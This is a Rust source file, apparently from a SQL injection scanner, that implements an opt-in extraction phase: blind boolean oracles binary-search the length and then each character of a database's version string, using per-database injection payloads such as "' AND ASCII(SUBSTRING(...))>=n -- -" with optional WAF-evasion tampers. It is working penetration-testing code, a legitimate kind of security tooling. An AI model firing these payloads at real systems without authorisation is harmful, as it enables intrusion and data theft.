#![deny(unsafe_code)]

//! Extraction phase (P1): `--extract` version-string inference via
//! length + char oracles. Extracted verbatim from `orchestrator.rs`;
//! no behaviour change.

use super::config::{BudgetConfig, EngineConfig, dbms_hint_kind};
use super::confirm::{first_finding_param, is_confirmed_finding, is_extraction_eligible};
use crate::{
    detection::baseline,
    error::InjektError,
    http::client::HttpClient,
    session::{
        scrubber::Scrubber,
        state::{Finding, SessionState},
    },
    target::{
        injection::{ProbeOpts, build_injection_spec_with_raw},
        markers::MarkerSet,
        raw_request::RawRequest,
        url::TargetUrl,
    },
    techniques::{payload_opts::build_final_payload_with_rng, tamper::Tamper},
};
use std::{sync::Arc, time::Instant};
use tokio::sync::RwLock;
use tokio_util::sync::CancellationToken;
use tracing::{info, warn};

/// Opt-in (`--extract`) version-string inference: length via `LENGTH()`
/// binary search, then char-by-char `ASCII(SUBSTRING())` oracle.
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
pub(crate) async fn run_extraction(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    config: &EngineConfig,
    target: &TargetUrl,
    target_str: &str,
    marker_set: &MarkerSet,
    raw_request: &Arc<Option<RawRequest>>,
    baseline: &baseline::Baseline,
    effective_tampers: &[Tamper],
    effective_opts: ProbeOpts,
) -> crate::error::Result<()> {
    if BudgetConfig::is_over_request_budget(
        state.read().await.request_count(),
        config.budget.request_budget,
    ) {
        warn!("request-budget spent, skipping extraction");
        return Ok(());
    }
    // Gate: unconfirmed 0.55 error findings alone must never trigger the
    // heavy boolean oracle (~270-700 req into `inference inconsistency`).
    // Require a boolean finding, an error with `extracted=yes`, or an
    // error with `bool_confirm=true`. Empty findings never qualify
    // (early `run_internal` gate already skips, this is defense in depth).
    {
        let snap = state.read().await.findings().to_vec();
        if snap.is_empty() {
            warn!("--extract requested but no findings — skipping");
            return Ok(());
        }
        if !is_extraction_eligible(&snap) {
            warn!(
                "likely FP, extraction skipped (no boolean-confirmed or error-with-fragment finding)"
            );
            return Ok(());
        }
    }
    // Pick first finding's param as injection point for extraction
    let (first_param, target_for_extract) = first_finding_param(state, target).await;

    // Determine DBMS for extraction query (`--dbms` hint wins).
    // Guess from confirmed findings only (see fingerprint gating).
    let dbms_kind = if let Some(hint) = dbms_hint_kind(config) {
        hint
    } else {
        let snap = state.read().await.findings().to_vec();
        let confirmed: Vec<Finding> = snap
            .iter()
            .filter(|f| is_confirmed_finding(f))
            .cloned()
            .collect();
        crate::dbms::fingerprint::guess_from_findings(&confirmed)
            .unwrap_or(crate::dbms::DbmsKind::MySql)
    };
    #[allow(clippy::match_same_arms)]
    let version_query = match dbms_kind {
        crate::dbms::DbmsKind::MySql => "SELECT @@version",
        crate::dbms::DbmsKind::Postgres => "SELECT version()",
        crate::dbms::DbmsKind::MsSql => "SELECT @@version",
        crate::dbms::DbmsKind::Oracle => "SELECT banner FROM v$version WHERE ROWNUM=1",
        crate::dbms::DbmsKind::Sqlite => "SELECT sqlite_version()",
        crate::dbms::DbmsKind::Unknown => "SELECT @@version",
    };

    // Build oracle: ASCII(SUBSTRING((query), pos+1, 1)) >= mid
    let baseline_body = baseline.representative_body_str();
    let baseline_mean = baseline.mean_ms;
    let client_clone = client.clone();
    let state_clone = Arc::clone(state);
    let cancel_clone = cancel.clone();
    let target_str_clone = target_str.to_owned();
    let target_clone2 = target_for_extract.clone();
    let first_param_clone = first_param.clone();
    let marker_set_clone = marker_set.clone();
    let raw_request_clone = raw_request.as_ref().clone();

    // First, infer length via LENGTH(query) if possible (try lengths 1..64)
    // Use retry per guess to mitigate single WAF/network hiccup; require 2 trials.
    // Seeded tamper RNG so `--seed` builds identical payloads.
    let mut rng = crate::seeded_rng::make_rng(config.seed);
    let mut inferred_len: usize = 0;
    for len_guess in 1..=64usize {
        if cancel_clone.is_cancelled() {
            break;
        }
        #[allow(clippy::match_same_arms)]
        let base_payload = match dbms_kind {
            crate::dbms::DbmsKind::MySql => {
                format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
            }
            crate::dbms::DbmsKind::Postgres => {
                format!("' AND LENGTH(({version_query})::text)>={len_guess} --")
            }
            crate::dbms::DbmsKind::MsSql => {
                format!("' AND LEN(({version_query}))>={len_guess} --")
            }
            crate::dbms::DbmsKind::Oracle => {
                format!("' AND LENGTH(({version_query}))>={len_guess} --")
            }
            crate::dbms::DbmsKind::Sqlite => {
                format!("' AND LENGTH(({version_query})::text)>={len_guess} --")
            }
            crate::dbms::DbmsKind::Unknown => {
                format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
            }
        };
        let payload = build_final_payload_with_rng(
            &base_payload,
            effective_tampers,
            &config.evasion.payload_opts,
            &mut rng,
        );
        // Retry logic: require 2 probes, treat as true only if majority true.
        // Transport/body errors are never scored (empty body => similarity
        // ~0 => false positive); a guess with no valid trial is skipped
        // without breaking so a transient blip cannot truncate inference.
        let mut true_count = 0usize;
        let mut valid_trials = 0usize;
        for _ in 0..2 {
            let Some(spec) = build_injection_spec_with_raw(
                &target_clone2,
                &target_str_clone,
                &first_param_clone,
                &payload,
                &marker_set_clone,
                raw_request_clone.as_ref(),
                effective_opts,
                &config.evasion.payload_opts,
            ) else {
                warn!(
                    len_guess,
                    "extraction probe spec build failed, skipping trial"
                );
                continue;
            };
            let start = Instant::now();
            let resp = client_clone.send_with_retry(spec, &cancel_clone).await;
            let ms = start.elapsed().as_secs_f64() * 1000.0;
            state_clone.write().await.increment_requests();
            let body = match resp {
                Ok(r) => match client_clone.read_body_string_with_timeout(r).await {
                    Ok(b) => b,
                    Err(e) => {
                        warn!(error=%e, len_guess, "extraction probe body read failed, skipping trial");
                        continue;
                    }
                },
                Err(e) => {
                    // Cancelled must abort, never be scored or retried as transport noise.
                    if matches!(e, crate::http::client::ClientError::Cancelled) {
                        return Ok(());
                    }
                    warn!(error=%e, len_guess, "extraction probe failed, skipping trial");
                    continue;
                }
            };
            valid_trials += 1;
            let diff = crate::detection::response_diff::diff_against_baseline(
                &baseline_body,
                &body,
                baseline_mean,
                ms,
                100.0,
            );
            if diff.confidence < 0.4 {
                true_count += 1;
            }
            // small jitter between retries
            if cancel_clone.is_cancelled() {
                break;
            }
        }
        if valid_trials == 0 {
            warn!(
                len_guess,
                "extraction length probe inconclusive (transport errors), skipping guess"
            );
            continue;
        }
        let is_true = valid_trials > 0 && true_count >= valid_trials;
        // Unanimous-of-valid (== majority for the 2-trial loop): a
        // single TRUE glitch must not validate a length guess (it would
        // misalign the whole extraction oracle), and a guess with no
        // valid trial was already skipped above.
        // If we saw 0 true after 2 trials, length guess exceeded
        if !is_true {
            inferred_len = len_guess - 1;
            break;
        }
        if len_guess == 64 {
            inferred_len = 64;
        }
    }
    if inferred_len == 0 {
        warn!("length inference failed, falling back to 16");
        inferred_len = 16; // fallback with warning
    }
    info!(len=%inferred_len, "inferred version length");

    // Now extract string char by char via binary search oracle
    let engine = crate::extraction::engine::ExtractionEngine::new(
        crate::extraction::engine::ExtractionConfig::default(),
    );
    let dbms_for_closure = dbms_kind;
    let version_query_owned = version_query.to_owned();
    let baseline_body2 = baseline_body.clone();
    let baseline_mean2 = baseline_mean;
    let client_for_oracle = client_clone.clone();
    let state_for_oracle = state_clone.clone();
    let cancel_for_oracle = cancel_clone.clone();
    let target_for_oracle = target_clone2.clone();
    let param_for_oracle = first_param_clone.clone();
    let marker_for_oracle = marker_set_clone.clone();
    let raw_for_oracle = raw_request.as_ref().clone();

    let target_str_for_oracle = target_str_clone.clone();
    let tampers_for_oracle = effective_tampers.to_vec();
    let popts_for_oracle = config.evasion.payload_opts.clone();
    let seed_for_oracle = config.seed;
    let oracle = move |pos: usize, mid: u8| {
        let client = client_for_oracle.clone();
        let state = state_for_oracle.clone();
        let cancel = cancel_for_oracle.clone();
        let target = target_for_oracle.clone();
        let param = param_for_oracle.clone();
        let marker_set = marker_for_oracle.clone();
        let raw = raw_for_oracle.clone();
        let baseline_body = baseline_body2.clone();
        let version_query = version_query_owned.clone();
        let dbms_kind = dbms_for_closure;
        let target_str = target_str_for_oracle.clone();
        let tampers = tampers_for_oracle.clone();
        let popts = popts_for_oracle.clone();
        let opts = effective_opts;
        let seed = seed_for_oracle;
        async move {
            // build ASCII(SUBSTRING) >= mid payload
            #[allow(clippy::match_same_arms)]
            let base = match dbms_kind {
                crate::dbms::DbmsKind::MySql => format!(
                    "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
                    pos + 1,
                    mid
                ),
                crate::dbms::DbmsKind::Postgres => format!(
                    "' AND ASCII(SUBSTRING(({version_query})::text,{},1))>={} --",
                    pos + 1,
                    mid
                ),
                crate::dbms::DbmsKind::MsSql => format!(
                    "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} --",
                    pos + 1,
                    mid
                ),
                crate::dbms::DbmsKind::Oracle => format!(
                    "' AND ASCII(SUBSTR(({version_query}),{},1))>={} --",
                    pos + 1,
                    mid
                ),
                crate::dbms::DbmsKind::Sqlite => format!(
                    "' AND UNICODE(SUBSTR(({version_query}),{},1))>={} --",
                    pos + 1,
                    mid
                ),
                crate::dbms::DbmsKind::Unknown => format!(
                    "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
                    pos + 1,
                    mid
                ),
            };
            // Fresh RNG per oracle call from the run seed: deterministic
            // per `--seed`, independent of async scheduling order.
            let mut rng = crate::seeded_rng::make_rng(seed);
            let payload = build_final_payload_with_rng(&base, &tampers, &popts, &mut rng);
            // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling.
            // Transport/body errors are retried (bounded) then propagated
            // as `Err` — never scored as `""` (similarity ~0 => wrong bit).
            // The engine treats `Err` as an abstention/retry, so one
            // hiccup cannot corrupt a bit.
            let mut last_err: Option<String> = None;
            for _ in 0..3 {
                let Some(spec) = build_injection_spec_with_raw(
                    &target,
                    &target_str,
                    &param,
                    &payload,
                    &marker_set,
                    raw.as_ref(),
                    opts,
                    &popts,
                ) else {
                    warn!(pos, mid, "extraction oracle spec build failed, retrying");
                    last_err = Some("invalid header/cookie value".to_owned());
                    continue;
                };
                let start = Instant::now();
                let resp = client.send_with_retry(spec, &cancel).await;
                let ms = start.elapsed().as_secs_f64() * 1000.0;
                state.write().await.increment_requests();
                let body = match resp {
                    Ok(r) => match client.read_body_string_with_timeout(r).await {
                        Ok(b) => b,
                        Err(e) => {
                            warn!(error=%e, pos, mid, "extraction oracle body read failed, retrying");
                            last_err = Some(e.to_string());
                            continue;
                        }
                    },
                    Err(e) => {
                        warn!(error=%e, pos, mid, "extraction oracle probe failed, retrying");
                        last_err = Some(e.to_string());
                        continue;
                    }
                };
                let diff = crate::detection::response_diff::diff_against_baseline(
                    &baseline_body,
                    &body,
                    baseline_mean2,
                    ms,
                    100.0,
                );
                // similar => true (>= mid)
                return Ok::<bool, InjektError>(diff.confidence < 0.4);
            }
            Err::<bool, InjektError>(InjektError::Http(format!(
                "extraction oracle transport failure at pos {pos} mid {mid}: {}",
                last_err.unwrap_or_else(|| "unknown".to_owned())
            )))
        }
    };
    let extracted = match engine.extract(inferred_len, oracle, &cancel_clone).await {
        Ok(value) => value,
        Err(crate::error::InjektError::Cancelled) => {
            return Err(crate::error::InjektError::Cancelled);
        }
        Err(error) => {
            // Best-effort phase: a destabilized oracle (page changed
            // mid-run, WAF kicked in) must not nuke the detection
            // findings with a hard `inference inconsistency` failure.
            warn!(error=%error, "extraction oracle destabilized, keeping detection findings");
            return Ok(());
        }
    };
    let exposed = {
        use secrecy::ExposeSecret;
        extracted.expose_secret().to_owned()
    };
    info!(extracted=%Scrubber::hash_truncated(&exposed), len=%exposed.len(), "extraction done");
    // scrubbed hash logged, raw stored as SecretString zeroized after report
    state.write().await.push_extracted(extracted);
    Ok(())
}
